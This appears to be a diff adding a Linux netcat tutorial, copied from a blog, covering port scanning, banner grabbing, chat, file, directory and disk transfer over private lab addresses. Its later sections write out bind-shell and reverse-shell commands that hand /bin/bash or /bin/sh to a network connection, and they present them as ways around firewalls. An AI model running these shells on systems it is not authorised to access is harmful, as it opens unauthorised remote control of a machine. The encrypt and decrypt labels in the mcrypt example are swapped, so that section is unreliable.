@@ -1,0 +1,251 @@
+
+
+Linux Netcat command – The swiss army knife of networking:
+==========================================================
+
+
+
+Here are some of the usage of netcat.
+
+Server A: 172.31.100.7
+Server B: 172.31.100.23
+
+
+1. Port scanning:
+=================
+Port scanning is done by system admin and hackers to find the open ports at some machine. It helps them to identify the venerability in the system.
+# nc -z -v -n 172.31.100.7 21-25
+
+It can work in both TCP and UDP mode, default is TCP mode, to change to udp use -u option
+-z option tell netcat to use zero IO .i.e the connection is closed as soon as it opens and no actual data exchange take place.
+-v option is used for verbose option.
+-n option tell netcat not to use the DNS lookup for the address.
+
+This command will print all the open ports between 21 to 25.
+
+Banner is a text that services sends when you connects to them. Banner are very usefull when you are trying to velberability in the system as it identify the type and version of the services. NOTE not all services may send banner.
+Once You have found the open ports you can easily grab the service banner by connecting to them using netcat.
+
+# nc -v 172.31.100.7 21
+The Linux netcat command will connect to open port 21 and will print the banner of the service running at that port.
+
+
+
+
+2. Chat Server:
+===============
+If you want to chat with your friend there are numerous software and messenger services available at your disposal.But what if you do not have that luxury anymore like inside your computer lab, where all outside connections are restricted, how will you communicate to your friend who is sitting in the next room. Don’t worry my friend because netcat has a solution for you just create a chat server and a predetermined port and he can connects to you.
+
+Server:
+# nc -l 1567
+The Linux netcat command starts a tcp server at port 1567 with stdout and stdin for input output stream i.e. The output is displayed at the shell and input is read from shell.
+
+
+Client:
+# nc 172.31.100.7 1567
+After this whatever you type on machine B will appear on A and vice-versa.
+
+
+
+
+3. File transfer:
+=================
+Most of the time we are trying to transfer file over network and stumble upon the problem which tool to use. There are again numerous methods available like FTP, SCP, SMB etc. But is it really worth the effort to install and configure such complicated software and create a sever at your machine when you only need to transfer one file and only once.
+
+Suppose you want to transfer a file “file.txt” from A to B
+Anyone can be server or client, lets make A as server and B as client.
+
+Server:
+# nc -l 1567 < file.txt
+
+Client:
+# nc -n 172.31.100.7 1567 > file.txt
+
+Here we have created a server at A at redirected the netcat input from file file.txt, So when any connection is successfull the netcat send the content of the file.
+Again at the client we have redirect the output of netcat to file.txt. When B connects to A , A sends the file content and B save that content to file file.txt.
+
+It is not necessary do create the source of file as server we can work in the eopposeit order also. Like in the below case we are sending file from B to A but server is created at A. This time we only need to redirect ouput of netcat at to file and input at B from file.
+
+B as server:
+Server:
+# nc -l 1567 > file.txt
+
+Client:
+# nc 172.31.100.23 1567 < file.txt
+
+
+
+
+4. Directory transfer:
+======================
+Sending file is easy but what if we want to send more than one files, or a whole directory, its easy just use archive tool tar to archive the files first and then send this archive.
+Suppose you want to transfer a directory over the network from A to B.
+
+Server:
+# tar -cvf – dir_name | nc -l 1567
+
+Client:
+# nc -n 172.31.100.7 1567 | tar -xvf -
+
+Here at server A we are creating the tar archive and redirecting its outout at the console through -. Then we are piping it to netcat which is used to send it over network.
+At Client we are just downloading the archive file from the server using the netcat and piping its output tar tool to extract the files.
+
+Want to conserve bandwidth by compressing the archive, we can use bzip2 or other tool specific to content of files.
+
+Server:
+# tar -cvf – dir_name| bzip2 -z | nc -l 1567
+Compress the archive using the bzip2 utility.
+
+Client:
+# nc -n 172.31.100.7 1567 | bzip2 -d |tar -xvf -
+Decompress the archive using bzip2 archive
+
+
+
+
+5. Encrypt your data when sending over the network:
+===================================================
+If you are worried about the security of data being sent over the network you can encrypt your data before sending using some tool like mcrypt.
+
+Server:
+# nc localhost 1567 | mcrypt –flush –bare -F -q -d -m ecb > file.txt
+Encrypt the data using the mcrypt tool.
+
+Client:
+# mcrypt –flush –bare -F -q -m ecb < file.txt | nc -l 1567
+Decrypt the data using the mcrypt tool.
+
+Both the above commands will propmt for passowrd make sure to use the same password on both.
+Here we have used mcrypt for encryption but any tool can be used.
+
+
+
+
+6. Stream a video:
+==================
+Not the best method to stream but if the server doesn’t have the specific tools, then with netcat we still have hope.
+
+Server:
+# cat video.avi | nc -l 1567
+Here we are just reading the video file and redirecting its output to netcat
+
+Client:
+# nc 172.31.100.7 1567 | mplayer -vo x11 -cache 3000 -
+Here we are reading the data from the socket and redirecting it to mplayer.
+
+
+
+
+7. Cloning a device:
+====================
+If you have just installed and configured a Linux machine and have to do the same to other machine too and do not want to do the configuration again. No need to repeat the process just boot the other machine with some boot-able pen drive and clone you machine.
+
+Cloning a linux PC is very simple. Suppose your system disk is /dev/sda
+Server:
+# dd if=/dev/sda | nc -l 1567
+
+Client:
+# nc -n 172.31.100.7 1567 | dd of=/dev/sda
+
+dd is a tool which reads the raw data from the disk, we are just redirecting its output stream through a netcat server to the other machine and writing it to the disk, it will copy everything along with the partition table. But if we have already done the partition and need to move only the root partition we can change sda with sda1, sda2 etc depending where out root is installed.
+
+
+
+
+8. Opening a shell:
+===================
+We have used remote Shell using the telnet and ssh but what if they are not installed and we do not have the permission to install them, then we can create remote shell using netcat also.
+
+If your netcat support -c and -e option (traditional netcat)
+Server:
+# nc -l 1567 -e /bin/bash -i
+
+Client:
+# nc 172.31.100.7 1567
+Here we have created a netcat server and indicated it to run /bin/bash command when connection is successful.
+
+If netcat doesn't support -c or -e options(openbsd netcat) we can still crate remote shell.
+Server:
+# mkfifo /tmp/tmp_fifo
+# cat /tmp/tmp_fifo | /bin/sh -i 2>&1 | nc -l 1567 > /tmp/tmp_fifo
+
+Here we have created a fifo. Then we have piped the content of this fifo file using pipe command to a shell 2>&1 is used to redirect stderr to same file where stdout is redirected which is piped to netcat server running at port 1567. Now here again we have redirected the output of netcat to fifo file.
+
+Explanation:
+The input received from network is written to fifo file.
+The fifo file is read by cat command and its content is sent to sh command. Sh command processes the received input and write it back to netcat. Netcat send the output over the network to client.
+All this is possible because pipe causes the command to run in parallel. The fifo file is used instead of regular file because the fifo causes the read to wait while if it was an ordinary file the cat command would have ended as soon as started reading an empty file.
+
+At client is just as simple as conecting to server
+Client:
+# nc -n 172.31.100.7 1567
+
+And you will get a shell prompt at the client
+
+
+
+
+9. Reverse Shell:
+=================
+Reverse shell are shell opened at the client side. Reverse shell are so named because unlike other configuration here server is using the services provided by the client.
+
+Server:
+# nc -l 1567
+
+At the client side simply tell netcat to execute the shell when connection is complete.
+Client:
+# nc 172.31.100.7 1567 -e /bin/bash
+
+Now what is so special about reverse shell.
+Reverse shell is often used to bypass the firewall restrictions like blocked inbound connections. For example, I have a private IP address of 172.31.100.7 and I connect to outside network with a proxy server. If I want to access a shell at this machine from outside the network say 1.2.3.4, then I'll use reverse shell for this purpose.
+
+
+
+
+10. Specify Source Port:
+========================
+Suppose your firewall filters all ports but 25 then you need to specify the source port also with -p option
+
+Server:
+# nc -l 1567
+
+Client:
+# nc 172.31.100.7 1567 -p 25
+
+You need root permissions to use port less than 1024.
+This command will open the port 25 at the client which will be used for communication otherwise any random port can be used.
+
+
+
+
+11. Specify Source Address:
+===========================
+Suppose you have more than one addresses for your machine and you want to explicitly tell which address to use for outgoing data. Then we can specify the ip address with -s option in netcat
+
+Server:
+# nc -u -l 1567 < file.txt
+
+Client:
+# nc -u 172.31.100.7 1567 -s 172.31.100.5 > file.txt
+
+This command will bind the address 172.31.100.5.
+
+These are just some of the examples to play with netcat.
+Some Other uses can be.
+        Telnet client with -t option,
+        HTTP client to download files,
+        Check mail by connecting to mail server and using SMTP protocol,
+        Stream your desktop using ffmpeg to grab our desktop and many more.
+
+In short if you know the protocol you can implement any client using netcat as medium for network communication.
+
+
+
+
+
+
+
+Reference:
+http://mylinuxbook.com/linux-netcat-command/
+
+
